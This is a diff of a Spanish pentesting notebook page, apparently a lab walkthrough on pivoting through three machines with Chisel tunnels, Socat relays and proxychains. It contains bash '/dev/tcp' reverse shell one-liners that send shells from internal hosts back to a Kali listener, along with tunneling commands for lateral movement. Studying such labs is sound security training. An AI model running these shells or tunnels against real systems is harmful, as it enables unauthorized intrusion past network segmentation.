@@ -23,6 +23,16 @@
               <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
               <a class="vault-file is-active" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
             </details>
+            <details class="vault-folder" open>
+              <summary>Escalada de Privilegios</summary>
+              <details class="vault-folder vault-subfolder" open>
+                <summary>Linux</summary>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+              </details>
+              <details class="vault-folder vault-subfolder">
+                <summary>Windows</summary>
+              </details>
+            </details>
           </nav>
         </aside>
 
@@ -44,109 +54,148 @@
             <p class="eyebrow">pivoting / chisel / socat</p>
             <h2>Chisel y Socat</h2>
 
-            <div class="note-kv">
+  
+
+            <p><a href="https://github.com/jpillora/chisel">Chisel</a>: permite crear túneles TCP y SOCKS en ambos sentidos mediante port forwarding local o reverse.</p>
+            <p><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">Socat</a>: permite redirigir conexiones TCP/UDP entre hosts y puertos. Es muy útil para transportar reverse shells a través de varios pivotes.</p>
+
+            <h2>1. Esquema del laboratorio</h2>
+          <div class="note-kv">
               <p><code>Kali:</code> <span class="lab-red">10.10.10.12</span></p>
-              <p><code>Maquina 1:</code> <span class="lab-red">10.10.10.13</span> / <span class="lab-blue">20.20.20.13</span></p>
-              <p><code>Maquina 2:</code> <span class="lab-blue">20.20.20.14</span> / <span class="ip-green">30.30.30.12</span></p>
-              <p><code>Maquina 3:</code> <span class="ip-green">30.30.30.10</span></p>
+              <p><code>Máquina 1:</code> <span class="lab-red">10.10.10.13</span> / <span class="lab-blue">20.20.20.13</span></p>
+              <p><code>Máquina 2:</code> <span class="lab-blue">20.20.20.14</span> / <span class="ip-green">30.30.30.12</span></p>
+              <p><code>Máquina 3:</code> <span class="ip-green">30.30.30.10</span></p>
             </div>
 
-            <p><a href="https://github.com/jpillora/chisel">Chisel Repositorio</a>: crea tuneles de <code>Kali</code> a <code>otras redes</code>.</p>
-            <p><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat">Socat Repositorio</a>: crea tuneles de <code>otras redes</code> a <code>Kali</code>.</p>
-
-            <h2>Chisel (PortForwarding)</h2>
+            <h2>2. Chisel: Port Forwarding y SOCKS</h2>
             <section class="code-card">
-              <h3>Kali Server puerto 9090</h3>
+              <h3>Kali: levantar servidor Chisel en el puerto 9090</h3>
               <pre><code>chisel server -p 9090 --reverse --socks5</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 1 cliente: Portforwarding</h3>
-              <pre><code># Conexion Socket: Maquina_1:9090 -&gt; Kali:1080
-# Portforwarding: Maquina_1:8080 -&gt; Kali:80
-# Portforwarding: Maquina_1:4443 -&gt; Kali:443
+              <h3>Máquina 1: cliente Chisel con reverse SOCKS y reverse port forwarding</h3>
+              <pre><code># SOCKS reverse:
+# Kali:1080 -&gt; red accesible desde Máquina 1
+
+# Reverse port forwarding:
+# Kali:80  -&gt; Máquina 1:8080
+# Kali:443 -&gt; Máquina 1:4443
+
 chisel client 10.10.10.12:9090 R:1080:socks R:80:127.0.0.1:8080 R:443:127.0.0.1:4443
 
-# Anadir al final del /etc/proxychains4.conf de kali -&gt; 127.0.0.1 1080
-# Ya tenemos visibilidad con la red azul y podemos transferir archivos a la maquina 2 desde maquina1:8080
+# Añadir al final de /etc/proxychains4.conf en Kali:
+# socks5 127.0.0.1 1080
+
+# Ya tenemos visibilidad con la red azul.
 proxychains whatweb 20.20.20.14</code></pre>
             </section>
 
             <aside class="callout warning">
-              <p>La red azul no tiene visibilidad con nosotros, no podriamos mandarnos una <code>revshell</code>. Para eso usamos <code>socat</code>, para entablar conexiones de otra red a Kali.</p>
+              <p>La red azul no tiene visibilidad directa con Kali, así que no podríamos recibir una <code>reverse shell</code> directamente desde esa red. Para eso usamos <code>socat</code>, redirigiendo conexiones desde una máquina pivote hacia Kali.</p>
             </aside>
 
-            <h2>Socat (ReverseShell)</h2>
+            <h2>3. Socat: Reverse Shell desde Máquina 2 hacia Kali</h2>
             <section class="code-card">
-              <h3>Maquina 1: redirigir puerto 1111 a Kali:443</h3>
-              <pre><code># Si ponemos el puerto 9090 en vez de 443, lo mandamos a chisel server
-socat tcp-l:1111,fork,reuseaddr tcp:10.10.10.12:443</code></pre>
+              <h3>Máquina 1: redirigir puerto 1111 hacia Kali:443</h3>
+              <pre><code># Todo lo que llegue a Máquina 1:1111 se reenvía a Kali:443.
+# Si ponemos el puerto 9090 en vez de 443, lo mandaríamos al servidor de Chisel.
+
+socat TCP-LISTEN:1111,fork,reuseaddr TCP:10.10.10.12:443</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Kali: escucha por el puerto 443</h3>
+              <h3>Kali: escuchar por el puerto 443</h3>
               <pre><code>nc -nlvp 443</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 2: reverse shell hacia el socat de Maquina 1</h3>
+              <h3>Máquina 2: reverse shell hacia el Socat de Máquina 1</h3>
               <pre><code>sh -i &gt;&amp; /dev/tcp/20.20.20.13/1111 0&gt;&amp;1</code></pre>
             </section>
 
             <aside class="callout danger">
-              <p>Tenemos conexion en ambas direcciones entre <code>Kali</code>, <code>Maquina 1</code> y <code>Maquina 2</code>. Ahora seguimos pivotando hacia <code>Maquina 3</code>.</p>
+              <p>Ahora tenemos conexión entre <code>Kali</code>, <code>Máquina 1</code> y <code>Máquina 2</code>. El siguiente paso es seguir pivotando hacia <code>Máquina 3</code>.</p>
             </aside>
 
+            <h2>4. Segundo pivote con Chisel hacia la red verde</h2>
             <section class="code-card">
-              <h3>Maquina 1: redirigir puerto 2222 a Kali:9090</h3>
-              <pre><code>socat tcp-l:2222,fork,reuseaddr tcp:10.10.10.12:9090</code></pre>
+              <h3>Máquina 1: redirigir puerto 2222 hacia Kali:9090</h3>
+              <pre><code>socat TCP-LISTEN:2222,fork,reuseaddr TCP:10.10.10.12:9090</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 2: tunel chisel por el puerto 1080</h3>
-              <pre><code>chisel client 20.20.20.13:2222 R:1090:socks</code></pre>
+              <h3>Máquina 2: cliente Chisel hacia Kali pasando por Máquina 1</h3>
+              <pre><code># Máquina 2 se conecta a Máquina 1:2222.
+# Máquina 1 reenvía esa conexión hacia Kali:9090.
+
+chisel client 20.20.20.13:2222 R:1090:socks</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Kali: nano /etc/proxychains4.conf</h3>
-              <pre><code># Anadimos al final
-127.0.0.1 1090
-127.0.0.1 1080</code></pre>
+              <h3>Kali: configurar Proxychains</h3>
+              <pre><code>nano /etc/proxychains4.conf
+
+# Añadimos al final:
+socks5 127.0.0.1 1090
+socks5 127.0.0.1 1080</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Proxychains: Kali tiene visibilidad con la red verde</h3>
-              <pre><code>proxychains whatweb 30.30.30.10</code></pre>
+              <h3>Proxychains: comprobar visibilidad con la red verde</h3>
+              <pre><code>proxychains whatweb 30.30.30.10
+
+# Alternativa para enumerar puertos:
+proxychains nmap -sT -Pn 30.30.30.10</code></pre>
             </section>
 
-            <p>Conseguimos visibilidad con la <code>Maquina 3</code> con proxychains, pero <code>Maquina 3</code> no tiene visibilidad con <code>Kali</code>.</p>
+            <p>Conseguimos visibilidad con la <code>Máquina 3</code> usando Proxychains, pero <code>Máquina 3</code> sigue sin tener visibilidad directa con <code>Kali</code>.</p>
 
+            <h2>5. Reverse Shell desde Máquina 3 hasta Kali</h2>
             <section class="code-card">
-              <h3>Kali: escucha por el puerto 443</h3>
+              <h3>Kali: escuchar por el puerto 443</h3>
               <pre><code>nc -nlvp 443</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 1: red verde puerto 4000 hacia Kali:443</h3>
-              <pre><code>socat tcp-l:4000,fork,reuseaddr tcp:10.10.10.12:443</code></pre>
+              <h3>Máquina 1: redirigir puerto 4000 hacia Kali:443</h3>
+              <pre><code>socat TCP-LISTEN:4000,fork,reuseaddr TCP:10.10.10.12:443</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 2: tunel puerto 3333 hacia Maquina 1</h3>
-              <pre><code>socat tcp-l:3333,fork,reuseaddr tcp:20.20.20.13:4000</code></pre>
+              <h3>Máquina 2: redirigir puerto 3333 hacia Máquina 1:4000</h3>
+              <pre><code>socat TCP-LISTEN:3333,fork,reuseaddr TCP:20.20.20.13:4000</code></pre>
             </section>
 
             <section class="code-card">
-              <h3>Maquina 3</h3>
+              <h3>Máquina 3: lanzar reverse shell hacia Máquina 2</h3>
               <pre><code>sh -i &gt;&amp; /dev/tcp/30.30.30.12/3333 0&gt;&amp;1</code></pre>
+            </section>
+
+            <aside class="callout warning">
+              <p>La reverse shell de <code>Máquina 3</code> viaja así: <code>Máquina 3:reverse shell</code> → <code>Máquina 2:3333</code> → <code>Máquina 1:4000</code> → <code>Kali:443</code>.</p>
+            </aside>
+
+            <h2>6. Limpieza</h2>
+            <section class="code-card">
+              <h3>Parar procesos de Socat</h3>
+              <pre><code>pkill socat</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Comprobar puertos en uso</h3>
+              <pre><code>ss -tulpn | grep -E "9090|1080|1090|443|1111|2222|3333|4000"</code></pre>
             </section>
 
             <h2>Tags</h2>
             <div class="tag-list">
               <span>pivoting</span>
-              <span>portforwarding</span>
               <span>chisel</span>
               <span>socat</span>
+              <span>proxychains</span>
+              <span>socks</span>
+              <span>port-forwarding</span>
+              <span>tunneling</span>
             </div>
           </div>
         </article>
